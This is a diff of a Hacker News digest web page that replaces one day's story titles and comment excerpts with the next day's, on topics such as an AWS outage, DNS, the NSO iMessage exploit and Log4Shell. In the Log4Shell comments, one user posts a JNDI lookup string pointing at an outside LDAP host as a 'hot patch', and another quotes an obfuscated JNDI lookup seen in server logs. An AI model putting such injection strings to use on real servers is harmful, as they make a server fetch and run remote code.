@@ -33,28 +33,28 @@
 	</div>
 
 	
-	<div class="day__date">15 December 2021</div>
+	<div class="day__date">16 December 2021</div>
 		
 		<div class="story story_small-padding-bottom">
 			
 			<div >
 				<div class="story__title">
-					<h3><a href="https://daily.tinyprojects.dev/paper_website">I started a paper website business</a></h3>
+					<h3><a href="https://news.ycombinator.com/item?id=29567170">Tell HN: AWS appears to be down again</a></h3>
 				</div>
 				<div class="story__comments">
 					<div class="story__comment">
-						<a href="https://news.ycombinator.com/item?id=29550812">
+						<a href="https://news.ycombinator.com/item?id=29567170">
 						
 							
-								<p class="story__comment_first line-clamp">"This is really cool. Use of GPT-3 to augment OCR is an amazing (and, retrospectively, obvious) insight and a great immediate use case for these language models.I wish Remarkable took this idea -- they really oversold their OCR capabilities[1]. It works great in their support and promo videos, but I found the actual performance to be absolutely terrible.[1] https://support.remarkable.com/hc/en-us/articles/36000266143..."</p>
-							
-						
-							
-								<p class="story__comment_others">"That is not the first time I see one of your stories and it always brings me a smile to see your new ideas and how implement them.It also amazes me how some countries make it so easy to open a business. Doing so in Brazil would be a legal nightmare. Your projects are super inspiring and I always have a mind to leave my job and start doing the same. I should probably move to the US or Canada first, otherwise it might not be possible for me."</p>
+								<p class="story__comment_first line-clamp">"I checked their health status page. All is good. /shttps://downdetector.com/status/aws-amazon-web-services/"</p>
 							
 						
 							
-								<p class="story__comment_others">"Marshall McLuhan would have appreciated this. Most everyone is familiar with his “The medium is the message” phrase, but if you dig a little deeper, you’ll come to appreciate his fascination with “Technology as extension of the human body.”That brio pen; the light bulb illuminating your workspace; the words you write; they’re all extensions of your body — from transcribing your internal thoughts, through your extremities, through transmission and distribution.If the author is reading this, I hope you’ll consider connecting with a few reputable online stationary retailers to offer a curated collection of reasonably-priced premium notebooks and pens. Additionally, consider expanding your original scope to include tags, which would open up your platform to paper-based automation opportunities.If you’ve made it this far and are just looking for the best cross-platform handwriting recognition, check out the Nebo app. It requires a stylus, but it’s the best I’ve come across and it reads PDFs, too."</p>
+								<p class="story__comment_others">"They really need to stop requiring SVPs or higher to show non-green status on the status page, as other HNers have revealed in last week&#39;s AWS post. It&#39;s effectively not a status page, and they could probably be sued if it can be demonstrated that X service was down but the status page showed green (since the SLA is based on status page). Should be automated and based on sample deployments running in every region and every service. And they should use non-AWS instances to do the sampling, so they can actually sample when, say, we experience the obligatory black friday us-east-1 outage every year."</p>
+							
+						
+							
+								<p class="story__comment_others">"I tried to monitor services status using https://stop.lying.cloud, but they are also hosted to AWS, and down too."</p>
 							
 						
 						</a>
@@ -67,24 +67,80 @@
 			
 			<div >
 				<div class="story__title">
-					<h3><a href="https://github.com/golang/go/commit/2580d0e08d5e9f979b943758d3c49877fb2324cb">Go Replaces Interface{} with &#39;Any&#39;</a></h3>
+					<h3><a href="https://jvns.ca/blog/2021/12/15/mess-with-dns/">Mess with DNS</a></h3>
 				</div>
 				<div class="story__comments">
 					<div class="story__comment">
-						<a href="https://news.ycombinator.com/item?id=29557066">
+						<a href="https://news.ycombinator.com/item?id=29568510">
 						
 							
-								<p class="story__comment_first line-clamp">"It&#39;s a type alias, introduced for generics. By the way, Go 1.18 Beta 1 is released (with generics): https://groups.google.com/g/golang-announce/c/eAjK4Oezs_A"</p>
+								<p class="story__comment_first line-clamp">"Neat project! Setting up your own DNS server for a throwaway domain is definitely a pain, especially if you&#39;ve never done so and use anything other than PowerDNS really, so this is useful for messing around with.I do hope the author has set some limits on the DNS configuration you can freely enter. One annoying trick DDoS spammers will use is that they will set up DNS records that are as large as possible to use for their botnet&#39;s amplification attack, so allowing them arbitrarily large requests on your domain may be problematic and may cause nasty complaints against your domain. I&#39;d recommend anyone running a free subdomain service (or something super cool like this!) to consider this in their configuration. We can&#39;t have nice things because of these bad people :("</p>
 							
 						
 							
-								<p class="story__comment_others">"This is fantastic. It&#39;ll make Go feel much less weird. eg from the diff:  []interface{}{1, 2.0, &#34;hi&#34;} -&gt; []any{1, 2.0, &#34;hi&#34;}
+								<p class="story__comment_others">"This tool is so neat! One thing I&#39;ve learned from it is my ISP (sonic.net) seems to be doing queries to _.example.com. For instance:$ dig @50.0.1.1 nelson.lily6.messwithdns.com aResults in two queries being answered by the messwithdns server. One for nelson.lily6.messwithdns.com as expected, but also one for _.lily6.messwithdns.com.Any guesses what that naked underscore query is for? Not every nameserver does it (Cloudflare, Google, Quad9, and Adguard all don&#39;t). But Sonic isn&#39;t the only one that does.I&#39;ve asked on Twitter and the best guess right now is it has something to do with RFC2782 or RFC 8552. But those are about using _ to make unique tokens that aren&#39;t likely domain names, things like _tcp or _udp. What would a naked _ mean?"</p>
+							
+						
+							
+								<p class="story__comment_others">"This is awesome.But I wish a service existed that made domain names easy enough to use that the average person could manage them. IMO you shouldn&#39;t have to learn DNS and TLS in order to securely use a domain name. If I want to sign up to have Fastmail host my email, why do I have to manually copy and paste a bunch of DNS records? Fastmail already knows exactly what records need to be set. I should be able to OAuth redirect over to my domain registrar and approve giving Fastmail control over a subdomain of my choosing, and Fastmail should be able to use a simple open protocol to update the records."</p>
+							
+						
+						</a>
+					</div>
+				</div>
+			</div>
+		</div>
+		
+		<div class="story story_small-padding-bottom">
+			
+			<div >
+				<div class="story__title">
+					<h3><a href="https://googleprojectzero.blogspot.com/2021/12/a-deep-dive-into-nso-zero-click.html">A deep dive into an NSO zero-click iMessage exploit: Remote Code Execution</a></h3>
+				</div>
+				<div class="story__comments">
+					<div class="story__comment">
+						<a href="https://news.ycombinator.com/item?id=29568625">
+						
+							
+								<p class="story__comment_first line-clamp">"From the top of the article:&gt; We want to thank Citizen Lab for sharing a sample of the FORCEDENTRY exploit with us, and Apple’s Security Engineering and Architecture (SEAR) group for collaborating with us on the technical analysis.This reminded me that NSO went after Citizen Lab on multiple fronts. They even tried to use a spy to talk to JSR (https://www.johnscottrailton.com) and make him say controversial things, which could be later used to malign Citizen Lab. Darknet Diaries covered this incident recently: https://darknetdiaries.com/episode/99/"</p>
+							
+						
+							
+								<p class="story__comment_others">"This is mind boggling. NSO used a compression format&#39;s instructions to create logic gates and then from there &#34;a small computer architecture with features such as registers and a full 64-bit adder and comparator which they use to search memory and perform arithmetic operations&#34;, all within a single pass of decompression. Combine this with a buffer overflow and you&#39;ve got your sploit."</p>
+							
+						
+							
+								<p class="story__comment_others">"It&#39;s a real shame that the people who came up with this exploit are working for NSO and not on solving P = NP or something. I&#39;m sure if we got them and the ones working on crypto at NSA in a room together, we&#39;d have it and clean unlimited energy in a week.I often feel sad thinking about how many brilliant engineers are dedicating their time to helping governments spy on people or other governments."</p>
+							
+						
+						</a>
+					</div>
+				</div>
+			</div>
+		</div>
+		
+		<div class="story story_small-padding-bottom">
+			
+			<div >
+				<div class="story__title">
+					<h3><a href="https://www.lunasec.io/docs/blog/log4j-zero-day-update-on-cve-2021-45046/">Log4Shell update: second Log4j vulnerability published</a></h3>
+				</div>
+				<div class="story__comments">
+					<div class="story__comment">
+						<a href="https://news.ycombinator.com/item?id=29561532">
+						
+							
+								<p class="story__comment_first line-clamp">"We also wrote a Log4Shell payload that will in-memory &#34;hot patch&#34; your server against Log4Shell.${jndi:ldap://hotpatch.log4shell.com:1389/a}If you paste that into a vulnerable server (or even throw it into a log statement in your `main` function), that&#39;ll patch you against this until you can manage to update properly.Source code is on GitHub here[0][1] if you want to host it yourself.(This work is based on Logout4Shell[2], but we rewrote it to fix the bugs, make it work in more places, and also hosted it so that you don&#39;t have to muck with DNS and live server stuff.)0: https://github.com/lunasec-io/lunasec/releases/1: (Go source code) https://github.com/lunasec-io/lunasec/tree/master/tools/log4...2: https://github.com/Cybereason/Logout4Shell"</p>
+							
+						
+							
+								<p class="story__comment_others">"(Maybe) Unpopular opinion: this whole ordeal is also due to the JRE being a clusterfuck of legacy and poor ideas. I understand it was the 90s but allowing to download arbitrary .class files from a server is _insane_, no matter how you spin it around."</p>
+							
+						
+							
+								<p class="story__comment_others">"I just saw a fun user-agent string in my (not log4j!) logs. In case anyone thought they could buy themselves some time with a naive filter on the string &#34;${jndi&#34; in front of your app or something, enjoy the user-agent string beginning:    ${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p} ...
 
-Now that Go is going to have generics, all we need is sugar syntax for early return on error -- like more modern languages such as Rust and Zig have -- and Go may finally be pleasant to program in!"</p>
-							
-						
-							
-								<p class="story__comment_others">"I&#39;m not sure I like this change. I liked interface{} since it just works out naturally from Go&#39;s relatively simple type system, and anyone could come to the conclusion without actually being told &#34;use interface{} to represent any possible value&#34; just by having an understanding of that type system. Adding what is simply a type alias, multiple words for the same underlying concept, to me just feels like jargon. I admire Go for its simplicity and clarity and this change gives me anxiety that that will be obfuscated."</p>
+Which I assume is a form of escaping/embedding which will work on at least some log4j&#39;s, although that&#39;s just an assumption I&#39;m making seeing this in my logs, I&#39;m not familiar with the details.I could have seen myself, not really a security person, thinking a filter on `jndi` would work too..."</p>
 							
 						
 						</a>
@@ -97,136 +153,26 @@ Now that Go is going to have generics, all we need is sugar syntax for early ret
 			
 			<div >
 				<div class="story__title">
-					<h3><a href="https://dynomight.net/plans/">Plans you&#39;re not supposed to talk about</a></h3>
+					<h3><a href="https://log4jmemes.com">Log4jmemes.com: for those of us that need a laugh</a></h3>
 				</div>
 				<div class="story__comments">
 					<div class="story__comment">
-						<a href="https://news.ycombinator.com/item?id=29554461">
+						<a href="https://news.ycombinator.com/item?id=29566541">
 						
 							
-								<p class="story__comment_first line-clamp">"The author presents the idea that &#34;you may be born into a culture with social practices that you don&#39;t understand but that work for your benefit; they may work better if you don&#39;t understand them!&#34;I find this idea a little repellant, but it&#39;s something Friedrich Hayek wrote about too.  (In my mind Hayek is the person most associated with distributed knowledge.)  ~&#34;You may not understand the forces that have led society to be organized the way that it is, but you should respect that sometimes the order of things reflects knowledge you may not have.&#34;One of his essays on this topic was &#34;Individualism: True and False&#34;:&#34;&#34;&#34;This brings me to my second point: the necessity, in any complex society in which the effects of anyone’s action reach far beyond his possible range of vision, of the individual submitting to the anonymous and seemingly irrational forces of society—a submission which must include not only the acceptance of rules of behavior as valid without examining what depends in the particular instance on their being observed but also a readiness to adjust himself to changes which may profoundly affect his fortunes and opportunities and the causes of which may be altogether unintelligible to him.&#34;&#34;&#34;https://fee.org/articles/individualism-true-and-false/"</p>
-							
-						
-							
-								<p class="story__comment_others">"This reminds me of CEO-speak.A CEO cannot speak their true mind or their true assessment of a situation. They can&#39;t say &#34;wow we&#39;re in trouble here&#34; because then people will jump ship and then the company will be even more in trouble (and the CEO would get sued for breaching Fiduciary Duty)What a CEO says is merely wishful thinking for a goal they want people to follow. They can never speak their true plan. (And of course, it&#39;s all just game theory, a more elaborate version of https://youtu.be/S0qjK3TWZE8)"</p>
-							
-						
-							
-								<p class="story__comment_others">"This reminds me of a set of poems, Knots, by R.D. Laing, the first of which goes:&gt; They are playing a game&gt; They are playing, at not playing a game&gt; If I show them I see they are, I shall break the rules and they will punish me.&gt; I must play their game, of not seeing I see the game.It&#39;s a lovely collection, and though I haven&#39;t thought about it recently, I think there&#39;s a lot of value in considering these kinds of unspoken self/group contradictions."</p>
-							
-						
-						</a>
-					</div>
-				</div>
-			</div>
-		</div>
-		
-		<div class="story story_small-padding-bottom">
-			
-			<div >
-				<div class="story__title">
-					<h3><a href="https://www.gitclear.com/blog/linux_touchpad_update_december_2021">Linux Touchpad Like MacBook Update: Touchpad Gestures Now Shipping</a></h3>
-				</div>
-				<div class="story__comments">
-					<div class="story__comment">
-						<a href="https://news.ycombinator.com/item?id=29555822">
-						
-							
-								<p class="story__comment_first line-clamp">"I wrote a (userland) general purpose and driver/hardware-agnostic multitouch daemon w/ gesture support for Linux that works with the existing input stack (i.e. doesn’t require switching to libinputy  but also supports it), if anyone is interested:https://neosmart.net/blog/2020/multi-touch-gestures-on-linux...https://github.com/mqudsi/syngestureThe biggest benefit is that you can use drivers with actually correct acceleration curves like xf86-input-synaptics (if you’re on X11) instead of the offensively bad, NIH reimplementation that ships with libinput.Oh wait, I’m on HN so I shouldn’t neglect to mention my project is written in rust!"</p>
-							
-						
-							
-								<p class="story__comment_others">"I&#39;ll make the same point I make every time this topic comes up: there are Chromebooks with great touchpad experiences, and that&#39;s been the case for a long, long time.  This is not a &#34;Linux&#34; or &#34;open source&#34; problem; this is a problem of ignorance and/or insufficient interest on the part traditional (i.e. non-ChromeOS) distros and their users.  It&#39;s nuts that this was and continues to be a high-profile, multi-year effort spawning discussions that end up framing the whole thing as elusive—rather than, you know, a solved problem that is pretty much not even worth mentioning but for the long tradition of poor execution."</p>
-							
-						
-							
-								<p class="story__comment_others">"Gestures are nice but what I love most about Apple trackpads is everything else. Accidental input avoidance, precision along with speed, registering a click anywhere on the surface…The gesture I care the most is smooth scrolling, which is a combination of OS graphic and input. Again, nothing smooth scrolls like the Mac or iOS"</p>
-							
-						
-						</a>
-					</div>
-				</div>
-			</div>
-		</div>
-		
-		<div class="story story_small-padding-bottom">
-			
-			<div >
-				<div class="story__title">
-					<h3><a href="https://www.washingtonpost.com/world/2021/12/14/south-africa-omicron-coronavirus/">Omicron variant more resistant to vaccine but causes less severe Covid: study</a></h3>
-				</div>
-				<div class="story__comments">
-					<div class="story__comment">
-						<a href="https://news.ycombinator.com/item?id=29552187">
-						
-							
-								<p class="story__comment_first line-clamp">"Moderna is working on a vaccine targeting the Omicron variant for 2022.[1]The mRNA vaccine technology is &#34;agile&#34;. There&#39;s a workflow from sequencing a virus to generating a candidate vaccine. It only took two days to generate the original COVID-19 vaccine. It&#39;s the clinical testing in small, then large groups that&#39;s the time consuming part.Also, the inhaled vaccines are entering clinical testing.[2] It&#39;s not like we&#39;re stuck with the original vaccines.[1] https://www.cnbc.com/2021/11/28/moderna-says-an-omicron-vari...[2] https://www.thetimes.co.uk/article/e1637976-5c3f-11ec-90d0-c..."</p>
-							
-						
-							
-								<p class="story__comment_others">"There are a few important bits here:First: &#34;The study by Discovery Health, South Africa’s largest health insurer, of 211,000 positive coronavirus cases, of which 78,000 were attributed to omicron, showed that risk of hospital admissions among adults who contracted covid-19 was 29 percent lower than in the initial pandemic wave that emerged in March 2020.&#34;and second: &#34;At the same time, the vaccine may offer 70 percent protection against being hospitalized with omicron, the study found, describing that level of protection as “very good.”&#34;Yes the vaccine does improve outcomes BUT the hospitalization rate for unvaccinated people is still lower with Omicron than previous variants."</p>
-							
-						
-							
-								<p class="story__comment_others">"I would imagine that a virus would eventually adapt/evolve to a point to where it co-exists harmoniously with the host organism. I&#39;ve heard somewhere that herpes simplex virus used to have terrible symptoms, like genital blisters, but over the years the most common variant has no symptoms, and most people have no idea they have it.... and a huge proportion of human have it.I would imagine all viral contagions would eventually go that route. Because a virus cannot propagate if the host organism goes extinct, or for whatever reason the host organism is itself not fit for survival, or diminished in any way.... anything that might impact virus propagation.I&#39;ve read some where the common cold was probably a pandemic virus originally, and it mutated to a common cold we have today, and we mutually evolved to deal with the common cold. Something like that..."</p>
-							
-						
-						</a>
-					</div>
-				</div>
-			</div>
-		</div>
-		
-		<div class="story story_small-padding-bottom">
-			
-			<div >
-				<div class="story__title">
-					<h3><a href="https://dimitarsimeonov.com/2021/12/12/opt-out-of-cynicism">Opt Out of Cynicism</a></h3>
-				</div>
-				<div class="story__comments">
-					<div class="story__comment">
-						<a href="https://news.ycombinator.com/item?id=29534714">
-						
-							
-								<p class="story__comment_first line-clamp">"The inimitable Hans Rosling[1] used to call himself a &#34;possibilist&#34;:People often call me an optimist, because I show them the enormous progress they didn&#39;t know about. That makes me angry. I&#39;m not an optimist. That makes me sound naive. I&#39;m a very serious “possibilist”. That&#39;s something I made up. It means someone who neither hopes without reason, nor fears without reason, someone who constantly resists the overdramatic worldview. As a possibilist, I see all this progress, and it fills me with conviction and hope that further progress is possible. This is not optimistic. It is having a clear and reasonable idea about how things are. It is having a worldview that is constructive and useful.           • • •
+								<p class="story__comment_first line-clamp">"The one about using print/console.log/whatever lol.I&#39;ve always done this, never have I used a library for this, because:  - running manually? &gt;myapp.log 2&gt;&amp;1
+  - using systemd? use journalctl
+  - using docker/kubernetes? capture automatically the stdout/stderr of your containers and pipe them through logstash or something
 
-In his book &#39;Factfulness&#39; (definitely read it), he talks about &#34;bad and better&#34;:Think of the world as a premature baby in an incubator.  The baby’s health status is extremely bad and her breathing, heart rate, and other important signs are tracked constantly so that changes for better or worse can quickly be seen. After a week, she is getting a lot better. On all the main measures, she is improving, but she still has to stay in the incubator because her health is still critical.Does it make sense to say that the infant’s situation is improving? Yes. Absolutely. Does it make sense to say it is bad? Yes, absolutely. Does saying “things are improving” imply that everything is fine, and we should all relax and not worry? No, not at all. Is it helpful to have to choose between bad and improving? Definitely not. It’s both. It’s both bad and better. Better, and bad, at the same time. That is how we must think about the current state of the world.[1] https://en.wikipedia.org/wiki/Hans_Rosling"</p>
+Real question: why would an application need to know where its logs go? This is not in the business perimeter, but the ops perimeter. Am I wrong?EDIT:Most responses are about configuring logging level, output format, etc... This can be done with a print-based approach without sending a request to an external service (which would need to trust you and your inputs).Example: Python&#39;s default logging module.Still, thank you for your insightful answers :)"</p>
 							
 						
 							
-								<p class="story__comment_others">"Another good quote for the OP is Miguel De Cervantes, author if Don Quixote: &#34;there is madness in too much sanity, and the greatest madness of all is to see things as they are instead of as they should be&#34;.He would know: Cervantes killed a rival on a duel at 17 and fled to sea.  They were attacked by pirates and he fought well before getting his hand blown off and taken prisoner.  He lived in captivity but befriended his captor, who taught him chess and literacy.  Then he was &#34;rescued&#34; by monks who bought his freedom but placed him on indentured servitude through debt, which he finally escaped by writing one of the early great novels.The point of this story is not that cynics were wrong but that one never would have survived his ordeal.  In a world fit for cynics, you have to be ready for things to go right if you want to escape."</p>
+								<p class="story__comment_others">"I spent this weekend removing Elasticsearch usage in our project. Just earlier I saw that our API wasn&#39;t responding, and was wondering how the hell someone with log4j got to us. Turns our AWS West 2 was down.If it weren&#39;t for the fear of DDOS attacks, I&#39;d put every webservice in a physical server in a basement somewhere and be done with it. I&#39;ve been fighting this whole year to simplify and reduce the number of dependencies we use, but it&#39;s such an exhausting battle as it goes against the grain of the industry right now, and everyone almost actively works against you: build now, someone else may pay this technical debt."</p>
 							
 						
 							
-								<p class="story__comment_others">"I&#39;m pretty sure I fall into the definition of a cynic given in the piece&#34;according to cynics, the world operates in a certain way, the elites are always the same, and will always be the same. The cynics think we are always playing the same game that has always been played. For example, a cynic may think that media’s only purpose is to sells your attention to advertisers - like I did here. And often they might be right.&#34;but I too be honest don&#39;t really see the problem with that kind of worldview. I&#39;m not chronically depressed or antagonistic because of it, but I think I&#39;d rather have what I&#39;d consider a realistic and true view of the world as it is rather than anything else.&#34;One of the strongest medicines against cynical mindset which I’ve tried is to do a “no-complain challenge”. I find its effects to be enormous and durable for years. In this challenge, you move a bracelet from one wrist to the other when you catch yourself complaining. The goal is to make it 21 days without having move the wrist. &#34;Before you start prescribing medicine we need to agree that cynicism is an illness first, which is not so easily done. I think the author conflates people who are sort of angry or pessimistic because of their lot in life with his definition of a cynic. I take the cynical view because of what I perceive are fundamental aspects of human nature collectively, not my mood personally. I can beat that challenge without a problem because I rarely complain, or win the lottery tomorrow and it wouldn&#39;t really have an impact of my views on the way the world operates overall."</p>
-							
-						
-						</a>
-					</div>
-				</div>
-			</div>
-		</div>
-		
-		<div class="story story_small-padding-bottom">
-			
-			<div >
-				<div class="story__title">
-					<h3><a href="https://www.esa.int/Science_Exploration/Space_Science/Webb/Webb_placed_on_top_of_Ariane_5">Webb placed on top of Ariane 5</a></h3>
-				</div>
-				<div class="story__comments">
-					<div class="story__comment">
-						<a href="https://news.ycombinator.com/item?id=29553620">
-						
-							
-								<p class="story__comment_first line-clamp">"I&#39;ve found that there&#39;s a weird internal psychology I have with any news relating to Webb.  I&#39;m just as excited and hopeful as everyone else.  But somehow the whole story underscores the perils of singular hope.  It also seems to underscore the inherent issues with massive, carefully planned, &#34;vertically&#34; scaled science projects a la 20th century NASA.  I&#39;ve carved out a little nook in my psyche to cope with the outcome that something goes wrong during the Webb&#39;s incredibly complicated launch process and all those years of effort come to nothing.It&#39;s also made me wonder if there&#39;s a way for humanity to pivot to more &#34;horizontally&#34; scaled science.  I&#39;m imagining a kind of science conducted by aggregating the data collected by many cheap, easily produced instruments instead of a few incredibly fragile, extremely difficult to build contraptions.  I have an intuition that we&#39;ll increasingly run up against practical limitations in undertaking ever more complex projects of this kind in the coming years."</p>
-							
-						
-							
-								<p class="story__comment_others">"Talking about Ariane 5, it&#39;s been interesting reading parts of its history. Particularly:&#34;Ariane 5&#39;s first test flight (Ariane 5 Flight 501) on 4 June 1996 failed, with the rocket self-destructing 37 seconds after launch because of a malfunction in the control software. A data conversion from 64-bit floating point value to 16-bit signed integer value to be stored in a variable representing horizontal bias caused a processor trap (operand error)because the floating point value was too large to be represented by a 16-bit signed integer. The software was originally written for the Ariane 4 where efficiency considerations (the computer running the software had an 80% maximum workload requirement) led to four variables being protected with a handler while three others, including the horizontal bias variable, were left unprotected because it was thought that they were &#34;physically limited or that there was a large margin of safety&#34;. The software, written in Ada, was included in the Ariane 5 through the reuse of an entire Ariane 4 subsystem despite the fact that the particular software containing the bug, which was just a part of the subsystem, was not required by the Ariane 5 because it has a different preparation sequence than the Ariane 4&#34;I wouldn&#39;t want any part on something as mission critical as getting a rocket to deliver something into orbit."</p>
-							
-						
-							
-								<p class="story__comment_others">"I&#39;ve never been so nervous for a launch in my life."</p>
+								<p class="story__comment_others">"On a serious note, I think it&#39;s a good time to remember to donate some $ to open source, especially the Apache foundation for their incredible work over the years!"</p>
 							
 						
 						</a>
@@ -239,24 +185,22 @@ In his book &#39;Factfulness&#39; (definitely read it), he talks about &#34;bad 
 			
 			<div >
 				<div class="story__title">
-					<h3><a href="https://github.com/lapce/lapce">Lapce – Fast and Powerful Code Editor written in Rust</a></h3>
+					<h3><a href="https://requestmetrics.com/web-performance/http3-is-fast">HTTP/3 Is Fast</a></h3>
 				</div>
 				<div class="story__comments">
 					<div class="story__comment">
-						<a href="https://news.ycombinator.com/item?id=29549173">
+						<a href="https://news.ycombinator.com/item?id=29563229">
 						
 							
-								<p class="story__comment_first line-clamp">"Author here. I didn&#39;t expect this will go on Hacker News. Although the editor has been my daily drive for almost one year now, it&#39;s really rough on the edges.The plugin system as described in the README hasn&#39;t been implemented yet."</p>
-							
-						
-							
-								<p class="story__comment_others">"You can also check out Helix (Kakoune-inspired, written in Rust, built-in LSP, terminal editor).
-https://helix-editor.com/There&#39;s also Amp (Vim inspired, written in Rust) although it looks as though development has stopped
-https://amp.rs/"</p>
+								<p class="story__comment_first line-clamp">"Author here. I am seeing a lot of comments about how the graphs are not anchored at 0.  The intent with the graphs was not to &#34;lie&#34; or &#34;mislead&#34; but to fit the data in a way that was mostly readable side by side.The goal was to show the high level change, in a glanceable way, not to get in to individual millisecond comparisons.  However, in the future I would pick a different visualization I think :)The benchmarking has also come under fire. My goal was to just to put the same site/assets on three different continents and retrieve them a bunch of times.  No more, no less.  I think the results are still interesting, personally.  Clean room benchmarks are cool, but so are real world tests, imo.Finally, there was no agenda with this post to push HTTP/3 over HTTP/2.  I was actually skeptical that HTTP/3 made any kind of difference based on my experience with 1.1 to 2.  I expected to write a post about &#34;HTTP/3 is not any better than HTTP/2&#34; and was frankly surprised that it was so much faster in my tests."</p>
 							
 						
 							
-								<p class="story__comment_others">"This feels like fresh air compared to tons of tools written in Javascript and running in a browser."</p>
+								<p class="story__comment_others">"What’s great about HTTP 1.1 is it’s simplicity. I mean, you can explain it to a complete newby and have that person write a functioning implementation in a few lines of shell script, all in one afternoon.In fact, you can probably figure it out by yourself just by looking at what goes across the wire.And yet, it runs the whole modern world. That’s beautiful. I think simplicity is underrated and it’s something I really value when choosing the tools I use."</p>
+							
+						
+							
+								<p class="story__comment_others">"I am a little confused about the test methodology.The post clearly explains that the big advantage of HTTP/3 is that it deals much better with IP packet loss. But then the tests are done without inducing (or at least measuring) packet loss?I guess the measured performance improvements here are mostly for the zero round-trip stuff then. But unless you understand how to analyze the security vs performance trade-off (I for one don&#39;t), that probably shouldn&#39;t be enabled."</p>
 							
 						
 						</a>
@@ -269,22 +213,34 @@ https://amp.rs/"</p>
 			
 			<div >
 				<div class="story__title">
-					<h3><a href="https://www.mapbox.com/blog/adaptive-projections">Reimagining projections for the interactive maps era</a></h3>
+					<h3><a href="https://picocss.com/">Pico CSS Framework</a></h3>
 				</div>
 				<div class="story__comments">
 					<div class="story__comment">
-						<a href="https://news.ycombinator.com/item?id=29540619">
+						<a href="https://news.ycombinator.com/item?id=29559961">
 						
 							
-								<p class="story__comment_first line-clamp">"This is cool but if we&#39;re not bound to static paper maps isn&#39;t the ultimate adaptive projection an interactive 3D perspective rendering of the globe? I suppose the downside is that you can&#39;t see both hemispheres at the same time.Then we can use our built-in spatial reasoning to compare how big some areas are by changing the perspective (as in real life), and shapes are only distorted by perspective which is very familiar."</p>
-							
-						
-							
-								<p class="story__comment_others">"I&#39;m the author of the article — happy to see this upvoted, feel free to ask any questions about web maps!"</p>
+								<p class="story__comment_first line-clamp">"This is a similar project (by a friend), that recreates the look and feel of the outstanding UK Government design system:https://gdcss.netlify.app/Same idea and Pico (classless, simple, small etc)."</p>
 							
 						
 							
-								<p class="story__comment_others">"Not much to add on the article itself other than &#34;when Vladimir Agafonkin posts something it&#39;s probably worth checking out in detail&#34; - too bad it doesn&#39;t come with some code to study this time ;)Tangent: I have autoplay turned off in Firefox and had no idea half of these images were supposed to be examples of zooming in and out until halfway into the article, where one of them had a description.This is not a critique on the article, just mentioning it for anyone else who might have similar settings. I&#39;m also somewhat surprised that I don&#39;t even get a pop-up from Firefox asking me if I want to allow the video elements to be played.(although I personally prefer my videos with controls enabling me to pause playback, instead of automatically looping fast-moving &#34;gifs&#34;, which can get very disorienting while reading, but that&#39;s a different discussion)"</p>
+								<p class="story__comment_others">"On the surface this looks nice, until you start using 3rd party componentsand the defaults they assumed for the component are overwritten because the default is changed.It&#39;s no coincidence that we use classes to explicitly apply styles, I don&#39;t think this library is a good idea.It&#39;s the same issues as changing native prototypes in Javascript, stuff depends on the defaults to be exactly as specified.Explicit &gt; Implicit
+Stuff magically working is great until you need to make an exception."</p>
+							
+						
+							
+								<p class="story__comment_others">"I wish more front-end stuff was oriented this way.
+This is how I want front-end coding to be:
+  Rattle off what I need, semantically,
+and then by default it will be styled and presented in a sensible way.
+  Then later, if our company stylist want our apps to 
+look a particular kind of fancy, he can configure some styling
+that will apply to all.This is also why I hate Windows WPF so much:
+If you just add a label, a field, and two OK/Cancel buttons to a form,
+it will look horrendous by default.
+  Only if you manually or deliberately set up some styling for it,
+will it start to look sensible.I want gui frameworks to look sensible out-of-the-box,
+without cluttering everything with piles of boilerplate crap."</p>
 							
 						
 						</a>
@@ -297,22 +253,78 @@ https://amp.rs/"</p>
 			
 			<div >
 				<div class="story__title">
-					<h3><a href="https://twitter.com/DanielNemenyi/status/1470385279383089153">“We removed the RSS feed since this technology became obsolete”</a></h3>
+					<h3><a href="https://www.macrumors.com/2021/12/15/apple-nixes-csam-references-website/">Apple removes references to CSAM  from its child safety webpage</a></h3>
 				</div>
 				<div class="story__comments">
 					<div class="story__comment">
-						<a href="https://news.ycombinator.com/item?id=29539575">
+						<a href="https://news.ycombinator.com/item?id=29564300">
 						
 							
-								<p class="story__comment_first line-clamp">"This hurts.RSS is the only way I know, without having to scrap things by hand, to get an aggregate of &#34;news/articles&#34; from the sites and blogs I follow, and I consider to be of good quality.I prefer to filter my information like this, instead of having to rely on some algorithm, or endlessly scrolling in a &#34;social medial wall&#34; full or clickbait articles, immortal/vintage memes or exuberant rants.If RSS dies, what is the alternative then? I understand that technically speaking it&#39;s not a good solution, but let&#39;s have something else before killing this.PS: I&#39;ve clicked on this link from a RSS reader (just a simple browser extension... that keeps me posted every morning)."</p>
-							
-						
-							
-								<p class="story__comment_others">"I&#39;m a very happy daily RSS user, but we ought to be upfront about its ginormous deficiencies:- every day I deal with broken links and broken images because my feed reader doesn&#39;t know from which URL it should resolve relative links- there&#39;s no pagination mechanism, or way for a client to ask for &#34;all posts since last Friday&#34;. If you want your feed to always have all posts available, you need to include the entirety of your archive in every feed response.- if I want to follow any link I get kicked back out to a bloated web page- lots of posts include iframes, or content that only makes sense with JS enabled- XMLDespite this, I still love RSS. It&#39;s what we&#39;ve got and we should continue to make the most of it. But it also sucks, and it&#39;s not any surprise that mostly only technical people use it. I think feeds are pretty much doomed to keep breaking and disappearing. Many of the replacements or pseudo-replacements that people come up with seem fine, but the problem - as always - is getting people to actually use it, which mostly never happens."</p>
+								<p class="story__comment_first line-clamp">"It&#39;s incredibly disturbing to me how little much of the HN crowd seems to understand how these systems like CSAM actually work.  I&#39;m not talking about the tech or programming.This is a fast track tool to putting anyone in jail for the most despised crime a person can commit.  The tool has no oversight, no transparency, no counter, no clear your name, no real usage definitions other than relentless spying on the &#34;protect the children&#34; fallacy.Most people don&#39;t understand how life destroying a false accusation is once the government paperwork is started.  At that point like it or not you are basically considered guilty by all the agents of the governement by default.  Their jobs are to prosecute not eliminate false positives.  Once you have been on their radar your life will never ever be the same.  And since it is CP related you will not even get helpful people willing to touch it with a 10ft pole cause of fear they may be implicated.  CSAM is a dastardly and effective way to establish a totalitarian rule by fear of life in jail, nothing more."</p>
 							
 						
 							
-								<p class="story__comment_others">"The whole (non-Spotify, ugh) podcast ecosystem would like a word about RSS being obsolete.Patreon (and to a greater extent, the podcasters I support) keep making real money out of me and millions of others every month for personalised RSS feeds for content. That RSS feed is the delivery vehicle. It&#39;s very reliable, I can use it in any app, much good, so benefit, wow."</p>
